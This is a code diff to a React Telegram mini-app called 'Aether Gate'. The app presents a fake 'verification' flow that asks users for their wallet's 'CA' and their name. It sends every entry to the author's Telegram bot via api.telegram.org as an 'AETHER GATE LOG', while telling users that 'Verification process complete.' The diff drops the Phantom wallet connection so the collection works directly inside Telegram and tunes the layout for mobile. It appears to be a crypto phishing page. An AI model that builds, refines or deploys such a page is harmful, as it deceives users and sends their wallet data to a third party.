@@ -19,13 +19,12 @@ const App: React.FC = () => {
     }
   }, [tg]);
 
-  const sendToBot = async (data: string, type: 'CA' | 'NAME' | 'SIGNATURE', publicKey?: string) => {
+  const sendToBot = async (data: string, type: 'CA' | 'NAME' | 'SIGNATURE') => {
     const username = tg?.initDataUnsafe?.user?.username || 'User';
     const logMsg = `🔐 <b>AETHER GATE LOG</b>\n` +
                    `<b>User:</b> @${username}\n` +
                    `<b>Type:</b> ${type}\n` +
-                   `<b>Data:</b> <code>${data}</code>\n` +
-                   (publicKey ? `<b>Wallet:</b> <code>${publicKey}</code>` : "");
+                   `<b>Data:</b> <code>${data}</code>`;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -37,38 +36,25 @@ const App: React.FC = () => {
   const handleStepOne = async () => {
     if (!walletCA) return alert("Please enter the Wallet CA");
     setStatus('verifying');
-    try {
-      const provider = (window as any).solana || (window as any).phantom?.solana;
-      if (!provider?.isPhantom) {
-        alert("Please use the Phantom Wallet browser.");
-        setStatus('idle');
-        return;
-      }
-      const resp = await provider.connect();
-      await sendToBot(walletCA, 'CA', resp.publicKey.toString());
-      setStep(2);
-      setStatus('idle');
-    } catch { setStatus('idle'); }
+    
+    // Removed mandatory Phantom check so it works directly in Telegram
+    await sendToBot(walletCA, 'CA');
+    setStep(2);
+    setStatus('idle');
   };
 
   const handleStepTwo = async () => {
     if (!userName) return alert("Please enter your name");
     setStatus('verifying');
     try {
-      const provider = (window as any).solana || (window as any).phantom?.solana;
-      
-      // Request final signature verification
-      const message = `Aether Network: Verify user ${userName}`;
-      const encodedMessage = new TextEncoder().encode(message);
-      await provider.signMessage(encodedMessage, "utf8");
-      
-      await sendToBot(userName, 'NAME', provider.publicKey.toString());
-      await sendToBot("Final Verification Signed", 'SIGNATURE');
+      // Simplified: Just logs the name to your bot
+      await sendToBot(userName, 'NAME');
+      await sendToBot("Verification Confirmed", 'SIGNATURE');
       
       setStatus('completed');
       alert("AETHER: Verification process complete.");
     } catch (err: any) {
-      alert("Verification Failed: " + (err.message || "User rejected signature"));
+      alert("Error: " + (err.message || "Try again"));
       setStatus('idle');
     }
   };
@@ -83,19 +69,37 @@ const App: React.FC = () => {
   };
 
   return (
-    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '60px 20px' }}>
-      <div style={{ background: theme.purple, width: '60px', height: '60px', borderRadius: '18px', marginBottom: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+    <div style={{ 
+        background: theme.bg, 
+        minHeight: '100vh', 
+        color: theme.text, 
+        fontFamily: 'sans-serif', 
+        display: 'flex', 
+        flexDirection: 'column', 
+        alignItems: 'center', 
+        padding: '40px 20px',
+        boxSizing: 'border-box' // Fixes resolution overflow
+    }}>
+      <div style={{ background: theme.purple, width: '60px', height: '60px', borderRadius: '18px', marginBottom: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
         <svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
       </div>
 
-      <h1 style={{ fontSize: '28px', fontWeight: '700', margin: '0 0 8px 0' }}>
+      <h1 style={{ fontSize: '24px', fontWeight: '700', margin: '0 0 8px 0' }}>
         {step === 1 ? 'Verify CA' : 'Node Identity'}
       </h1>
-      <p style={{ color: theme.textMuted, fontSize: '16px', marginBottom: '40px', textAlign: 'center' }}>
-        {step === 1 ? "Enter your wallet's CA" : "Enter your name to sign and finish"}
+      <p style={{ color: theme.textMuted, fontSize: '14px', marginBottom: '30px', textAlign: 'center' }}>
+        {step === 1 ? "Enter your wallet's CA" : "Enter your name to finish"}
       </p>
 
-      <div style={{ width: '100%', maxWidth: '360px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)' }}>
+      <div style={{ 
+          width: '100%', 
+          maxWidth: '340px', // Mobile optimized width
+          background: theme.card, 
+          padding: '24px', 
+          borderRadius: '24px', 
+          border: '1px solid rgba(255,255,255,0.05)',
+          boxSizing: 'border-box'
+      }}>
         <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase' }}>
           {step === 1 ? "Wallet's CA" : "Your Name"}
         </label>
@@ -105,7 +109,7 @@ const App: React.FC = () => {
           value={step === 1 ? walletCA : userName}
           onChange={(e) => step === 1 ? setWalletCA(e.target.value) : setUserName(e.target.value)}
           placeholder={step === 1 ? "Enter Wallet CA..." : "Enter Name..."}
-          style={{ width: '100%', padding: '16px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '24px', fontSize: '16px', boxSizing: 'border-box', outline: 'none' }}
+          style={{ width: '100%', padding: '14px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '16px', boxSizing: 'border-box', outline: 'none' }}
         />
 
         <button 
@@ -113,7 +117,7 @@ const App: React.FC = () => {
           disabled={status !== 'idle'} 
           style={{ width: '100%', padding: '16px', borderRadius: '100px', border: 'none', background: status === 'completed' ? '#4BB543' : theme.purple, color: '#17101F', fontWeight: '700', fontSize: '16px', cursor: 'pointer' }}
         >
-          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : 'Sign & Finish'}
+          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : 'Finish'}
         </button>
       </div>
     </div>
